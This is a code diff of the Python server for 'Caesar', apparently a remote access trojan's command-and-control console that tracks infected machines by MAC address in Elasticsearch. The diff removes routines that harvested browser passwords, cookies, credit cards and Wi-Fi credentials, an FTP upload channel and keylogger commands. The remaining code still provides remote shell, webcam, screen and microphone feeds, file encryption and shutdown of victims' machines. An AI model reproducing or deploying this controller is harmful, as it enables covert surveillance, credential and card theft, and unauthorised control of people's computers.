@@ -1,74 +1,56 @@
-import socket
-import threading
-from queue import Queue
-import time
 import os
 import re
 import json
+import time
+import struct
+import socket
+import threading
+from queue import Queue
 from datetime import datetime
-from getmac import get_mac_address as gma
 from es_handler import EsHandler
 from client_handler import ClientHandler
-import struct
-from data_analyzer import Analyzer
-
+from getmac import get_mac_address as gma
 
 
 
 class Caesar:
 
-        def __init__(self, host, port, db_name, es_url):
+        def __init__(self, host, port, db_name, es_url, client_folder_name):
             self.host = host
             self.port = port
-            self.esHandler = EsHandler(db_name, es_url)
-            self.clientHandler = ClientHandler()
+            self.sock = None
+            self.queue = Queue()
             self.socket_object_dict = {}
             self.current_session_id = str()
-            self.queue = Queue()
-            self.analyzer = Analyzer(db_name)
-            self.clientFolder = "ClientFolder"
+            self.clientHandler = ClientHandler()
+            self.clientFolder = client_folder_name
+            self.esHandler = EsHandler(db_name, es_url)
 
 
-
-            ##################################FTP SERVER CREDENTIALS#############################
-
-            self.FTP_PASS = ""
-            self.LOG_FILE = "log.txt"
-            self.FTP_HOST = "files.000webhost.com"
-            self.FTP_USER = ""
-
-            ##################################FTP SERVER CREDENTIALS#############################
-
-
-
-
-
-        #create socket and listen for client connections
+        # create socket and listen for connections
         def create_socket(self):
-            global sock
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.bind((self.host, self.port))
-                sock.listen(20) #listen for connection
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.bind((self.host, self.port))
+                self.sock.listen(20) #listen for connection
             except socket.error as err:
                 print("[-]Error unable to create socket!!!" + str(err))
 
 
-
-
-        #handles incoming connection
+        # handles incoming connections
         def handle_connections(self):
             while True:
+
                 try:
-                    conn, addr = sock.accept()
+                    conn, addr = self.sock.accept()
                     conn.setblocking(True)
-                    data = conn.recv(1024).decode()#recieves client system information
-                    ip = re.findall("'(.*?)'", str(addr))#extract ip from addr
+                    client_info = conn.recv(1024).decode()# recieves client system information
+                    ip = re.findall("'(.*?)'", str(addr))# extract ip from addr
                     ip = "".join(ip)
 
-                    #check if connected client already exists
-                    if (self.esHandler.is_conn_present(data.split()[0])):
-                        client_id = self.esHandler.update_document(data.split()[0], ip, data)
+                    # check if connected client already exists in ES index
+                    if (self.esHandler.is_conn_present(str(json.loads(client_info)['mac-address']))):
+                        client_id = self.esHandler.update_document(str(json.loads(client_info)['mac-address']), ip, client_info)
                         self.socket_object_dict.update({client_id:conn})
 
                         path = os.path.join(self.clientFolder, str(client_id))
@@ -77,33 +59,26 @@ class Caesar:
 
                         print("\n[+]Node " + str(ip) + " has reconnected!!!")
 
-                        self.store_harvested_data(conn, client_id)
-
-                    #create a new document if the client does not exist
+                    # create a new ES document if the client does not exist
                     else:
-                        client_id = str()
-                        dict_obj = self.esHandler.store_client_information(ip, conn, data)
+                        client_conn_dict = self.esHandler.store_client_information(ip, conn, client_info)
+                        client_id = next(iter(client_conn_dict))
 
-                        for k, v in dict_obj.items():
-                            client_id = k
                         path = os.path.join(self.clientFolder, str(client_id))
-
                         if not os.path.exists(path):
-                            os.mkdir(path) #create a folder for new client
+                            os.mkdir(path) # create a folder for new client using their ES client ID
 
-                        self.socket_object_dict.update(dict_obj)
+                        self.socket_object_dict.update(client_conn_dict)
                         print("\n[+]Node " + str(ip) + " has connected!!!")
 
-                        self.store_harvested_data(conn, client_id)
-
                 except Exception as e:
-                    #print("[-]Something went wrong connecting to client!!!")
                     print(e)
+                    # print("[-]Something went wrong connecting to client!!!")
                     break
 
 
 
-        #handles connection thread
+        # handles connection thread
         def thread_handler(self):
             for _ in range(2):
                 thread = threading.Thread(target=self.work)
@@ -130,17 +105,17 @@ class Caesar:
 
 
 
-        #displays caesar shell commands
+        # displays caesar shell commands
         def show_commands(self):
             user_guide = """
                 Caesar Commands
-                     'guide': [Display Caesar's user commands]
+                     'guide': ['Display Caesar's user commands']
                      'clients':['lists clients within ES index']
                      'connected':['lists all active connection within ES index']
-                     'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine ']
+                     'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine']
                      'delete (target ES Client_ID)': ['remove specified document from index']
                      'delete all': ['remove all document from index']
-                     'get (target ES Client_ID)': ['retrieves indexed data of specified target ']
+                     'get (target ES Client_ID)': ['retrieves indexed data of specified target']
                      'show fields (target ES Client_ID)': ['displays existing field for specified target']
                      'field (target ES Client_ID) (FIELD NAME):  ['displays specified field']
 
@@ -150,34 +125,18 @@ class Caesar:
                     'send (filename or absolute path)':['send specified file to the target client']      
                     'screenshot':['takes a screen shot of the client machine']
                     'camshot':['captures an image from the client's webcam']  
-                    'camfeed': [live feed from target's webcam]
-                    'screenfeed': [live feed from target's screen]
-                    'audiofeed': [live audio feed from target's microphone]
-                    'encrypt (PASSWORD) (FILENAME)': [encrypts specified file]            
-                    'decrypt (PASSWORD)(FILENAME)': [decrypts specified file]   
-                    'ftp download (FILENAME)' : [download specified file from FTP server]
-                    'ftp upload (FILE PATH)' : [uploads specified file to FTP server]      
-                    'start keylogger' : [starts Keylogger]
-                    'stop keylogger' : [stops Keylogger]
-                    'keylogger status' : [provides updatae on keylogger status]
-                    'reboot' : [reboot client system]
-                    'shutdown' : [shutdown client system]
-
-                Analyzer Commands
-                    'resolve history (target ES Client_ID)' : [cleans browsing history data and adds youtube channel name to excisting data]
-                    'browser summary (target ES Client_ID)' : [displays summary of browser data]
-                    'most active times (target ES Client_ID)': [displays target's active browsing times in descending order]
-                    'average active times (target ES Client_ID)' [displays target's average browsing times]
-                    'rank channels (target ES Client_ID) count': [displays target's most watched youtube channels in descending order]
-                    'rank websites (target ES Client_ID) count': [displays target's most visited website in descending order]
-                    'web titles (target ES Client_ID) (domain_name)': [display website titles for specified domain name]
-                    'video titles (target ES Client_ID) (channel_name)': [display video titles for specified youtube channel]
-                    'user activity (target ES Client_ID)': [ranks most used applications in descending order]
+                    'camfeed': ['live feed from target's webcam']
+                    'screenfeed': ['live feed from target's screen']
+                    'audiofeed': ['live audio feed from target's microphone']
+                    'encrypt (PASSWORD) (FILENAME)': ['encrypts specified file']            
+                    'decrypt (PASSWORD)(FILENAME)': ['decrypts specified file']   
+                    'reboot' : ['reboot client system']
+                    'shutdown' : ['shutdown client system']
             """
             print(user_guide)
 
 
-
+         # format text to bold and blue 
         def convert_caesar_text(self, text):
             RESET = "\033[0m"
             BOLD = "\033[1m"
@@ -198,92 +157,11 @@ class Caesar:
 
 
 
-        #sends null to the client and get the current working directory in return
+        # sends null to the client and get the current working directory in return
         def send_null(self, client_sock_object):
                 client_sock_object.send(str(" ").encode())
                 data = client_sock_object.recv(1024).decode()
                 print(str(data), end="")
-
-
-
-
-        #saves harvested system info from client in Elastic Search Index
-        def store_harvested_data(self, client_sock_object, client_id):
-            try:
-
-                installedAppData = self.recv_msg(client_sock_object)  
-                installedAppData =  json.loads(installedAppData.decode())
-                self.esHandler.append_information("installed-apps", installedAppData, client_id)
-
-
-                startupAppData = self.recv_msg(client_sock_object)   
-                startupAppData = json.loads(startupAppData.decode())
-                self.esHandler.append_information("startup-app-data", startupAppData, client_id)
-
-                wifiPasswordCredentials = self.recv_msg(client_sock_object)    
-                wifiPasswordCredentials = json.loads(wifiPasswordCredentials.decode())
-                self.esHandler.append_information("wifi-credentials", wifiPasswordCredentials, client_id)
-
-
-                #===============================================Browser Data===========================================
-
-                browserPasswordData = self.recv_msg(client_sock_object)   
-                browserPasswordData = json.loads(browserPasswordData.decode())
-                self.esHandler.append_information("browser-passwords", browserPasswordData, client_id)
-             
-                browserCookieData = self.recv_msg(client_sock_object)   
-                browserCookieData = json.loads(browserCookieData.decode())
-                self.esHandler.append_information("browser-cookie", browserCookieData, client_id)
-
-                browserHistoryData = self.recv_msg(client_sock_object)   
-                browserHistoryData = json.loads(browserHistoryData.decode())
-                self.esHandler.append_information("browser-history", browserHistoryData, client_id)
-
-                creditCardData = self.recv_msg(client_sock_object)   
-                creditCardData = json.loads(creditCardData.decode())
-                self.esHandler.append_information("credit-card-info", creditCardData, client_id)
-
-                autofillData = self.recv_msg(client_sock_object)   
-                autofillData = json.loads(autofillData.decode())
-                self.esHandler.append_information("autofill-data", autofillData, client_id)
-
-                #===============================================Browser Data===========================================
-
-                
-
-
-                #===============================================System Data============================================
-
-                memoryInfoData = self.recv_msg(client_sock_object)   
-                memoryInfoData = json.loads(memoryInfoData.decode())
-                self.esHandler.append_information("memory-info", memoryInfoData, client_id)
-
-                diskInfoData = self.recv_msg(client_sock_object)   
-                diskInfoData = json.loads(diskInfoData.decode())
-                self.esHandler.append_information("disk-info", diskInfoData, client_id)
-
-                networkInfoData = self.recv_msg(client_sock_object)   
-                networkInfoData = json.loads(networkInfoData.decode())
-                self.esHandler.append_information("network-info", networkInfoData, client_id)
-
-            
-                userActivityData = self.recv_msg(client_sock_object)   
-                userActivityData = json.loads(userActivityData.decode())
-                self.esHandler.append_information("user-activity-data", userActivityData, client_id)
-            
-
-                otherData = self.recv_msg(client_sock_object)   
-                otherData = json.loads(otherData.decode())
-                self.esHandler.append_information("other-data", otherData, client_id)
-
-                #===============================================System Data============================================
-
-                print("[+]Data extraction completed!!!")
-
-            except Exception as e:
-                print("[-]Error occured while collectiing data!!!")
-                print(e)
-
 
 
 
@@ -310,7 +188,7 @@ class Caesar:
 
 
 
-        #sends commands to the client
+        # sends commands to the client
         def handle_client_session(self, client_id, client_sock_object):
                 self.send_null(client_sock_object)
                 self.current_session_id = client_id
@@ -328,6 +206,7 @@ class Caesar:
 
                     elif cmd == "":
                         self.send_null(client_sock_object)
+
                     elif "get" in cmd:
                         try:
                             client_sock_object.send(str(cmd).encode())
@@ -342,6 +221,7 @@ class Caesar:
                             print(e)
                             print("[-]Connection terminated!!!")
                             break
+
                     elif "send" in cmd:
                         try:
                             client_sock_object.send(str(cmd).encode())
@@ -426,67 +306,6 @@ class Caesar:
                             print(e)
                             break
 
-                    elif "ftp download" in cmd:
-                        try:
-                            cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
-
-
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-
-                    elif "ftp upload" in cmd:
-                        try:
-
-                            cmd += f" {self.FTP_PASS} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
-
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-
-                    elif cmd == "start keylogger":
-
-                        try:
-
-                            cmd +=  f" {self.FTP_PASS} {self.LOG_FILE} {self.clientFolder} {self.current_session_id} {self.FTP_HOST} {self.FTP_USER}"
-
-
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-
-                    elif cmd == "stop keylogger":
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
-                    elif cmd == "keylogger status":
-                        try:
-                            client_sock_object.send(str(cmd).encode())
-                            data = client_sock_object.recv(1024).decode()
-                            print(str(data), end="")
-                        except Exception as e:
-                            print("[-]Connection terminated!!!")
-                            print(e)
-                            break
                     elif cmd.strip() == "reboot":
                         try:
                             cmd = cmd.strip()
@@ -518,7 +337,7 @@ class Caesar:
 
 
 
-        #shell interface
+        # shell interface
         def shell_interface(self):
                 while True:
                     print(self.convert_caesar_text("Caesar: "), end="")
@@ -538,6 +357,8 @@ class Caesar:
                         else:
                             print("[-]Invalid use of the show field command")            
 
+                    elif cmd.strip() == 'guide':
+                        self.show_commands()
 
                     elif 'get' in cmd:
                         client_id = cmd[4:]
@@ -565,80 +386,6 @@ class Caesar:
                             print("[-]Invalid use of the field command")
 
 
-                    elif "browser summary" in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 3: 
-                            client_id = cmd[2]
-                            self.analyzer.browser_history_summary(client_id)
-                        else:
-                            print("[-]Invalid use of the field command")
-
-
-                    elif "resolve history" in cmd:
-                        cmd = cmd.split()
-                        client_id = cmd[2]
-                        self.analyzer.yt_resolver(cmd[2])
-
-
-                    elif cmd.strip() == 'guide':
-                        self.show_commands()
-
-
-                    elif 'most active times' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.most_active_times(cmd[3])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'average active times' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.average_browsing_hours(cmd[3])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'web titles' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.get_web_titles(cmd[2], cmd[3])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'video titles' in cmd:
-                        cmd = cmd.split() 
-                        channel_name = ' '.join(cmd[3:])
-                        self.analyzer.get_video_titles(cmd[2], channel_name)
-                        
-
-                    elif 'rank channels' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.rank_youtube_channels(cmd[2], int(cmd[3]))
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'rank websites' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 4:
-                            self.analyzer.most_visited_websites(cmd[2], int(cmd[3]))
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-                    elif 'user activity' in cmd:
-                        cmd = cmd.split()
-                        if len(cmd) == 3:
-                            self.analyzer.get_windows_activity_history(cmd[2])
-                        else:
-                            print("[-]Invalid command!!!")
-
-
-
                     elif cmd.strip() == 'connected':
                         self.esHandler.get_connected_client(self.socket_object_dict)
 
@@ -647,7 +394,7 @@ class Caesar:
                         current_session_id = client_id
                         client_sock_object = self.get_socket_obj(client_id)
 
-                        #check if connection is still active
+                        # check if connection is still active
                         if(bool(self.socket_object_dict)):
                             try:
                                 client_sock_object.send("conn check".encode())
@@ -660,7 +407,6 @@ class Caesar:
 
                     else:
                         print("[-]Invalid command!!!")
-
 
 
 
